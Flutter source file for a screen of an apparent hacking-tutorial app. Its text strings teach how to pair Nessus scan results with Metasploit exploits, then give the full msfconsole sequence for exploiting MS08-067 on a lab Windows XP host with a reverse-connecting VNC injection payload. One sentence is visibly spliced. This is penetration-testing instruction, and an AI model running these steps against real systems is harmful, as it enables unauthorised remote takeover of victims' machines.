import 'package:flutter/material.dart';
import 'package:hackerstudiopro/basics/basics_main.dart';

class BasicsThree extends StatefulWidget {
  @override
  _BasicsThreeState createState() => _BasicsThreeState();
}

class _BasicsThreeState extends State<BasicsThree> {
  var text1 = ''' 

Out of all the tools discussed in this app, Metasploit is my favorite. In many ways, it is the quintessential hacker tool. It is powerful, flexible, free, and loaded with awesomeness.

In 2004, at Defcon 12, HD Moore and Spoonm rocked the world when they gave a talk titled “Metasploit: Hacking Like in the Movies”. This presentation focused on “exploit frameworks”. An exploit framework is a formal structure for developing and launching exploits. Frameworks assist the development process by providing organization and guidelines for how the various pieces are assembled and interact with each other.

Metasploit actually started out as a network game, but its full potential was realized when it was transformed into a full-fledged exploit tool. Metasploit actually contains a suite of tools that includes dozens of different functions for various purposes but it is probably best known for its powerful and flexible exploitation framework.

Metasploit allows you to select the target and choose from a wide variety of payloads. The payloads are interchangeable and not tied to a specific exploit. A payload is the “additional functionality” or change in behavior that you want to accomplish on the target machine. It is the answer to the question: “What do I want to do now that I have control of the machine?” Metasploit’s most popular payloads include adding new users, opening backdoors, and installing new software onto a target machine. The full list of Metasploit payloads will be covered shortly.

Metasploit can be downloaded for free from http://www.metasploit.com. If you are using Kali, Metasploit is already installed for you. There are several different ways to interact with Metasploit, but this section will focus on using the menu-driven, non-graphical user interface (GUI), text-based system called the msfconsole. Once you understand the basics, the msfconsole is fast, friendly, intuitive, and easy to use. The easiest way to access the msfconsole is by opening a terminal window and entering:

	msfconsole

The msfconsole can also be accessed through the applications menu on the desktop. Starting the msfconsole takes between 10 s and 30 s, so do not panic if nothing happens for a few moments. Eventually, Metasploit will start by presenting you with a welcome banner and an “msf>” command prompt. There are several different Metasploit banners that are rotated and displayed at random.community, and official funding, it is vital that you keep Metasploit up-to-date. This is easily accomplished by entering the following command into a terminal:

	msfupdate


  ''';

  var text2 = '''
  Now that we have an understanding of how to access and start the Msfconsole and a solid understanding of the terminology used, let us examine how we can use Metasploit. When first hearing about and using Metasploit, a common mistake of would-be hackers and penetration testers is the lack of organization and thoughtfulness. Remember, Metasploit is like a scalpel, not a hatchet. Or may be more appropriately, Metasploit is like a Barrett M107 sniper rifle, not an M60 machine gun. Most newcomers are overwhelmed by the sheer number of exploits and payloads; and usually get lost trying to find appropriate exploits. They spend their time blindly throwing every exploit against a target and hoping that something sticks. Later in this chapter, we will examine a tool that works in this manner but for now we need to be a little more refined.

Rather than blindly spraying exploits at a target, we need to find a way to match up known system vulnerabilities with the prepackaged exploits in Metasploit. Once you have learned this simple process, owning a vulnerable target becomes a cinch. In order to correlate a target’s vulnerabilities with Metasploit’s exploits, we need to review our findings from a recon process. We will start this process by focusing on the Nessus report or “ Nmap --script vuln ” output. Nessus is a vulnerability scanner and provides us with a list of known weaknesses or missing patches. When reviewing the Nessus output, you should make notes of any findings but pay special attention to the vulnerabilities labeled as “high” or “critical”. Many “high” or “critical” Nessus vulnerabilities, especially missing Microsoft patches, correlate directly with Metasploit exploits.

Assume that during your penetration test you uncovered a new target at the IP address 192.168.18.131. Running Nmap tells you that your new target is a Windows XP machine with service pack 3 installed and the firewall disabled. Continuing with your recon process, you run both the NSE-script vuln scan and Nessus against the target. Figure below shows the completed Nessus report for 192.168.18.131. Notice there are two “critical” findings. If you are following along with this example using an XP no service pack VM, Nessus probably identified a dozen or more “critical” vulnerabilities. This is one of the main reasons why I stress learning basic exploitation with older, unpatched versions of Windows!
  ''';

  var text3 = '''
  At this point, we know our target has at least two missing patches. Both these patches are labeled as “critical” and the descriptions that Nessus provides for both missing patches mention “remote code execution”. As an attacker, your heartbeat should be racing a little at this point because the chances are very good that Metasploit will be able to exploit the target for us.

Next we need to head over to Metasploit and look for any exploits pertaining to MS08-067 or MS09-001. Once we have started the msfconsole (and updated Metasploit), we can use the “search” command to locate any exploits related to our Nessus or Nmap findings. To accomplish this, we issue the “search” command followed by the missing patch number. For example, using the msfconsole, at the “msf>” prompt you would type

		search ms08-067

  ''';
  var text4 = '''
  Continuing with our example, we will use the MS08-067 because it has a higher ranking. In order to run Metasploit, we need to provide the framework with a series of commands. Because Metasploit is already running and we have already found our exploit, we continue by issuing the “use” command in the “msf>” terminal to select the desired exploit.

		use exploit/windows/smb/ms08_067_netapi

This command tells Metasploit to use the exploit that your vulnerability scanner identified. At this point your “msf>” prompt will change to match the prompt of your chosen exploit. Once we have the exploit loaded, we need to view theavailable payloads. This is accomplished by entering “show payloads” in the “msf>” terminal.

		show payloads

This command will list all the available and compatible payloads for the exploit you have chosen. To select one of the payloads, we type “set payload” followed by the payload name into the “msf>” terminal.
		
		set payload windows/vncinject/reverse_tcp

There are many payloads to choose from. We will discuss the most common payloads momentarily; however, a full examination of the different payloads is outside the scope of this app . Please review the Metasploit documentation for details on each of the available payloads. For this example, we will install VNC on the target machine and then have that machine connect back to us. If you are unfamiliar with VNC, it is remote control PC software that allows a user to connect to a remote machine, view the remote machine, and control the mouse and keyboard as if you were physically sitting at that machine. It works much the same as a remote desktop or a terminal server. It is important to note that the VNC software is not currently installed on the target machine. Remember that some exploits give us the ability to install software on our target machine. In this example, we are sending an exploit to our target machine. If successfully executed, the exploit will call the “install vnc” payload and remotely install the software on the victim machine without any user interaction. Different payloads will require different additional options to be set. If you fail to set the required options for a given payload, your exploit will fail. There are few things worse than getting this far and failing to set an option. Be sure to watch this step closely. To view the available options, issue the “show options” in the “msf>” terminal:

		show options

After issuing the show options command, we are presented with a series of choices that are specific to the payload we have chosen. When using the “windows/vncinject/reverse_tcp” payload, we see that there are two options that need to be set because they are missing any default information. The first is “RHOST” and the second is “LHOST”. RHOST is the IP address of the target (remote) host and LHOST (localhost) is the IP address you are attacking from. To set these options, we issue the “set option_name” command in the msf> terminal:

		set RHOST 192.168.18.131
		set LHOST 192.168.18.130

Now that you have required options set, it is usually a good idea at this point to reissue the “show options” command to ensure you are not missing any information.

		show options

Once you are sure that you have entered all the information correctly, you are ready to launch your exploit. To send your exploit to the target machine, simply type the keyword “exploit” into the “msf>” terminal and hit the Enter key to begin the process.

	exploit

Figure below shows the minimum command set (minus the “show payloads” and “show options” command) required to launch the exploit. After sending the “exploit” command, you can sit back and watch as the magic happens. To truly appreciate the beauty and complexity of what is going on here, you need to build your understanding of buffer overflows and exploitation. This is something that is highly encouraged when you finish the basics covered in this app. Metasploit gives you the ability to stand on the shoulders of giants and the power to launch incredibly complex attacks with just a few commands.
  ''';
  @override
  Widget build(BuildContext context) {
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Stack(
        children: <Widget>[
          Container(
            // Here the height of the container is 45% of our total height
            height: size.height * .45,
            decoration: BoxDecoration(
              color: Color(0xFFF5CEB8),
              image: DecorationImage(
                alignment: Alignment.centerLeft,
                image: AssetImage("assets/images/undraw_pilates_gpdb.png"),
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: <Widget>[
                Align(
                  alignment: Alignment.topLeft,
                  child: GestureDetector(
                    onTap: () => Navigator.pushReplacement(context,
                        MaterialPageRoute(builder: (context) => BasicsMain())),
                    child: Container(
                      alignment: Alignment.center,
                      height: 52,
                      width: 52,
                      decoration: BoxDecoration(
                        color: Color(0xFFF2BEA1),
                        // color:Colors.orange,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(Icons.arrow_back_ios, color: Colors.white),
                    ),
                  ),
                ),
                Text("Metasploit Unleashed",
                    style: TextStyle(
                        fontSize: 30,
                        color: Colors.grey,
                        fontWeight: FontWeight.bold)),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: ListView(
                      children: <Widget>[
                        Text(
                          text1,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/msf1.jpg')),
                        Text(
                          text2,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(
                            child: Image.asset('assets/images/nessus1.jpg')),
                        Text(
                          text3,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/msf2.jpg')),
                        Text(
                          text4,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(
                            child: Image.asset('assets/images/msf3.jpg')),
                            SizedBox(height: 10,),
                        Container(
                            child: Image.asset('assets/images/msf4e.jpg')),
                        RaisedButton(
                          child: Text(
                              "Follow me on Social Media if you have Questions"),
                          onPressed: () {
                            followMe();
                          },
                          color: Color(0xFFF2BEA1),
                        )
                      ],
                    ),
                  ),
                )
              ],
            ),
          )
        ],
      ),
    );
  }

  void followMe() {
    showDialog(
        context: context,
        builder: (context) {
          return AlertDialog(
            backgroundColor: Color(0xFFF5CEB8),
            title: Text('Follow me'),
            content: Text("Twitter: @Millime64755564"),
            actions: <Widget>[
              FlatButton(
                  onPressed: () => Navigator.pop(context), child: Text('Exit'))
            ],
          );
        });
  }
}
